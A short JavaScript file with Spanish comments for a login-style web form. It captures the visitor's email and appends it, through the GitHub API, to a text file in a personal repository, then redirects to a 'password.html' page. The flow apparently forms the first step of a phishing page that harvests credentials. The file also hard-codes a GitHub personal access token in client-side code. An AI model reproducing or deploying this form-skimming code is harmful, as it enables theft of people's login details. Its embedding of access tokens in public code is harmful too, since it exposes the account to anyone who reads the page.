// Obtiene el formulario por su ID
const loginForm = document.getElementById("commentForm");

// Escucha el evento 'submit' del formulario
loginForm.addEventListener("submit", async (event) => {
  event.preventDefault(); // Evita refrescar la página

  // Obtiene el valor del campo de correo electrónico
  const emailInput = document.getElementById("email");
  const email = emailInput.value;

  if (!email) {
    alert("Por favor ingresa tu correo electrónico.");
    return;
  }

  // 🔹 Guardar el correo en GitHub (flujo sin servidor)
  try {
    const repoOwner = "JDvalenciaD";        // <-- tu usuario de GitHub
    const repoName = "txtarchivos";   // <-- tu repo
    const filePath = "comentarios.txt";    // <-- archivo
    const token = "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";              // <-- tu token personal

    // 1. Leer archivo actual
    const res = await fetch(
      `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
      { headers: { Authorization: `token ${token}` } }
    );

    const data = await res.json();
    let content = "";
    let sha = null;

    if (data.content) {
      content = atob(data.content); // Decodificar base64
      sha = data.sha;               // Hash para actualizar
    }

    // 2. Agregar el nuevo correo
    content += `\nUsuario: ${email}`;

    // 3. Subir cambios a GitHub
    await fetch(
      `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
      {
        method: "PUT",
        headers: {
          Authorization: `token ${token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          message: "Nuevo correo desde formulario",
          content: btoa(content),
          sha: sha,
        }),
      }
    );

    // 4. Redirigir a la página siguiente
    window.location.href = "password.html";

  } catch (error) {
    console.error("❌ Error subiendo datos:", error);
    alert("Ocurrió un error al guardar tu correo.");
  }
});

// 🔹 Para que el campo email tenga el foco automáticamente
document.addEventListener("DOMContentLoaded", () => {
  const emailInput = document.getElementById("email");
  emailInput.focus();
});
